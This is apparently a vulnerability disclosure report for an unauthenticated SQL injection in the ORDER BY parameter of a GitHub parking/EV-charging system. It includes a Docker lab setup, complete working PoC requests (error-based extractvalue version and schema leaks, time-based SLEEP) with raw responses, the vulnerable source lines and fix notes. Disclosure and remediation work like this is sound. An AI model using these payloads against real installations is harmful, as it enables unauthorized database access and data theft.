### Vulnerability details

**Official website / Product:** https://github.com/981011512/-- (parking / EV charging system, caifeng / 才风智慧)

**Repository:** 981011512/-- (stars at selection: 4717)

**Vulnerability type:** SQLi (unauthenticated ORDER BY / MyBatis `${orderByClause}`)

**Vulnerability versions:** master@d6f6f32ac90dcd13dbbcd38c6ab2b684f2da783a (default branch as of 2025-04-20)

**Vulnerability URL / Parameter:** `GET /adlinks/getListByQuery` → query parameter `orderBy`

**Complex:** yes

### Verification procedure

Lab topology (original `labs/parking-r57-a2/` was removed after verification per hygiene, and images `parking-r57-a2-app:latest` / `mysql:5.7` were also removed — details below match the verified run):

- App: self-built `parking-r57-a2-app:latest` (image id `1421cabc846e`, ~286MB), artifact jar `parking-ad-sqli-lab.jar`, entrypoint `java -jar /app/app.jar`, container port **8099**
- Database: `mysql:5.7` (verified version **5.7.44**, matching error-based leak; image id `5107333e08a8`)
- Port: host **127.0.0.1:23702** → app 8099
- Auth: **no credentials**. Upstream `ResourceServerConfig` / `InterceptorConfig` list `/adlinks/getListByQuery` under `permitAll`
- Seed data: table `cf_ad_links` with at least 2 rows (response ids `l1`/`l2`, schema `caifeng`); otherwise time-based `SLEEP` scales with row count and may under-delay
- Lab note: full product is Dubbo microservices; lab strips OAuth/Dubbo but keeps the same HTTP→SQL sink: `CfAdLinksController.getListByQuery` → `CfAdLinksServiceImpl.setOrderByClause(user orderBy)` → `order by ${orderByClause}` in `CfAdLinksMapper.xml`
- Upstream commit: `d6f6f32ac90dcd13dbbcd38c6ab2b684f2da783a`
- Build skeleton (Dockerfile used at audit time; multi-stage `maven:3.8.6-jdk-8` → `eclipse-temurin:8-jre`):

```dockerfile
FROM maven:3.8.6-jdk-8 AS build
WORKDIR /src
COPY app/pom.xml .
COPY app/src ./src
RUN mvn -q -DskipTests package

FROM eclipse-temurin:8-jre
WORKDIR /app
COPY --from=build /src/target/parking-ad-sqli-lab.jar /app/app.jar
EXPOSE 8099
ENTRYPOINT ["java","-jar","/app/app.jar"]
```

Equivalent compose skeleton (directory may be recreated as `labs/parking-r57-a2/`; `app` must be built via the Dockerfile above; the original lab tree held the minimal Spring Boot sink implementation plus JDBC/schema seed and was lost with teardown; schema name `caifeng` confirmed via error-based leak; DB credentials were embedded in the lab):

```yaml
services:
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_DATABASE: caifeng
      # MYSQL_ROOT_PASSWORD / MYSQL_USER / MYSQL_PASSWORD: match app datasource (original lab-embedded)
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1"]
      interval: 5s
      timeout: 5s
      retries: 30
  app:
    build: .
    image: parking-r57-a2-app:latest
    ports:
      - "23702:8099"
    depends_on:
      mysql:
        condition: service_healthy
```

1. Under `labs/parking-r57-a2/` (or an equivalent directory) run `docker compose up -d --build`, wait until mysql is healthy and the app listens on 8099. Expected bring-up:

```
 Network parking-r57-a2_default  Created
 Container parking-r57-a2-mysql-1  Started
 Container parking-r57-a2-mysql-1  Healthy
 Container parking-r57-a2-app-1  Started
CONTAINER                REPOSITORY           TAG       IMAGE ID        SIZE
parking-r57-a2-app-1     parking-r57-a2-app   latest    1421cabc846e    286MB
parking-r57-a2-mysql-1   mysql                5.7       5107333e08a8    501MB
```

2. Baseline: `orderBy=sort_index ASC` returns HTTP 200 with two rows in ~10ms.
3. Time-based: `orderBy=(SELECT SLEEP(5))` delays ~**10s** for two result rows; see PoC B below.
4. Error-based: `orderBy=extractvalue(1,concat(0x7e,version()))` returns HTTP 500 leaking MySQL version `~5.7.44`; `database()` leaks `~caifeng`; see PoC A below (primary).

### Complete vulnerability PoC

#### PoC A — error-based `extractvalue` version leak (primary)

Complete HTTP request (Docker-verified):

```http
GET /adlinks/getListByQuery?orderBy=extractvalue(1,concat(0x7e,version())) HTTP/1.1
Host: 127.0.0.1:23702
User-Agent: r57-a2-parking-sqli-verify
Accept: application/json
Connection: close

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 500 
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 12:08:30 GMT
Connection: close

3be
{"timestamp":"2026-11-02T12:08:30.597+0000","status":500,"error":"Internal Server Error","message":"\n### Error querying database.  Cause: java.sql.SQLException: XPATH syntax error: '~5.7.44'\n### The error may exist in class path resource [com/cf/ad/dao/mapper/CfAdLinksMapper.xml]\n### The error may involve com.cf.ad.dao.mapper.CfAdLinksMapper.selectByExample-Inline\n### The error occurred while setting parameters\n### SQL: select                 id, ad_id, scenes, platform, carrier_id, sort_index, start_time, end_time, show_counts,     click_counts, create_time         from cf_ad_links                                            order by extractvalue(1,concat(0x7e,version()))\n### Cause: java.sql.SQLException: XPATH syntax error: '~5.7.44'\n; uncategorized SQLException; SQL state [HY000]; error code [1105]; XPATH syntax error: '~5.7.44'; nested exception is java.sql.SQLException: XPATH syntax error: '~5.7.44'","path":"/adlinks/getListByQuery"}
0

```

#### PoC B — time-based `SLEEP(5)` (secondary / delay proof)

Complete HTTP request (space URL-encoded):

```http
GET /adlinks/getListByQuery?orderBy=(SELECT%20SLEEP(5)) HTTP/1.1
Host: 127.0.0.1:23702
User-Agent: r57-a2-parking-sqli-verify
Accept: application/json
Connection: close

```

Complete HTTP response (HTTP 200, still returns 2 rows; measured delay `time_based_elapsed_seconds=10.014`):

```http
HTTP/1.1 200 
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 12:08:40 GMT
Connection: close

1ed
{"data":[{"id":"l1","adId":"ad1","scenes":"carpark-order","platform":"web","carrierId":"c1","sortIndex":1,"startTime":0,"endTime":9999999999999,"showCounts":0,"clickCounts":0,"createTime":1700000000000,"carrierIds":null,"cfAd":null},{"id":"l2","adId":"ad1","scenes":"carpark-order","platform":"web","carrierId":"c2","sortIndex":2,"startTime":0,"endTime":9999999999999,"showCounts":0,"clickCounts":0,"createTime":1700000000000,"carrierIds":null,"cfAd":null}],"success":true,"message":"success"}
0

```

Verification result notes:

- Error-based response contains `XPATH syntax error: '~5.7.44'`, proving `orderBy` is interpolated into SQL and executed; same technique with `database()` leaks `~caifeng`.
- Time-based measurement vs ~0.01s baseline:

```
time_based_elapsed_seconds=10.014
baseline_expected=~0.01s; SLEEP(5) over 2 rows ~10s
error_based_leaked_version=5.7.44
error_based_leaked_database=caifeng
```

- Upstream `ResourceServerConfig` / `InterceptorConfig` list `/adlinks/getListByQuery` under `permitAll` (no JWT required).

### Vulnerability analysis

The ad API controller passes `CfAdLinksQuery.orderBy` into the service unchanged. The service calls `CfAdLinksExample.setOrderByClause(orderBy)` with no column allowlist. MyBatis Generator-style `selectByExample` interpolates `${orderByClause}` into `ORDER BY`, yielding unauthenticated SQL injection. Attackers can blind-time, error-exfiltrate version/schema, and escalate to UNION-based data theft.

The repo also contains many authenticated `setOrderByClause(query.getOrderBy())` sites and `DbUtils.makeQuery` `group`/`like`/`in` concatenations; this counted finding is limited to the unauthenticated, Docker-verified adlinks sink.

Trigger / sink source (full path and line numbers; upstream tree under `repos/parking-981011512/`):

```java
# File: cf-framework-parent/cf-ad/cf-ad-api/src/main/java/com/cf/ad/api/controller/CfAdLinksController.java
# Lines: 44-46
    @RequestMapping(value = "getListByQuery", method = RequestMethod.GET)
    public ResponseResult getListByQuery(CfAdLinksQuery cfAdLinksQuery) throws Exception {
        List<CfAdLinks> cfAdLinks = cfAdLinksService.getListByQuery(cfAdLinksQuery);
```

```java
# File: cf-framework-parent/cf-ad/cf-ad-service/src/main/java/com/cf/ad/service/impl/CfAdLinksServiceImpl.java
# Lines: 147-148
        if(StringUtils.isNotEmpty(cfAdLinksQuery.getOrderBy())){
            cfAdLinksExample.setOrderByClause(cfAdLinksQuery.getOrderBy());
```

```xml
# File: cf-framework-parent/cf-ad/cf-ad-dao/src/main/resources/com/cf/ad/dao/mapper/CfAdLinksMapper.xml
# Lines: 89-91
    <if test="orderByClause != null" >
      order by ${orderByClause}
    </if>
```

```java
# File: cf-framework-parent/cf-ad/cf-ad-api/src/main/java/com/cf/ad/api/config/ResourceServerConfig.java
# Lines: 65-68
                .antMatchers("/v2/api-docs", "/swagger-resources/configuration/ui",
                        "/swagger-resources","/swagger-resources/configuration/security",
                        "/swagger-ui.html","/webjars/**","/adlinks/getListByQuery","/ad/findById","/adlinks/selectContainAdByQuery").permitAll()
```

### Fix notes

1. Allowlist `orderBy` to known columns + ASC/DESC (see existing `DbUtils.makeAllowOrderBy` in-tree).
2. Never use `${}` for ORDER BY in MyBatis; map enums or safe identifiers.
3. Reconsider anonymous access to `/adlinks/getListByQuery`, or drop client-controlled sort.
